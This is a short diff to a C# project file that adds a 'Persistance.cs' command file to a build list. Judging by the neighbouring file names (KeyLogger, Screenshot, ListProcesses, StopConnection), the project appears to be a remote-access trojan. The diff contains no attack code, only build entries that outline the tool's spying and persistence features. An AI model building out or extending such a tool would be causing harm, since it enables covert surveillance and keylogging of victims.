@@ -82,6 +82,7 @@
     <Compile Include="Commands\Exit.cs" />
     <Compile Include="Commands\KeyLogger.cs" />
     <Compile Include="Commands\ListProcesses.cs" />
+    <Compile Include="Commands\Persistance.cs" />
     <Compile Include="Commands\PlaySound.cs" />
     <Compile Include="Commands\Screenshot.cs" />
     <Compile Include="Commands\StopConnection.cs" />
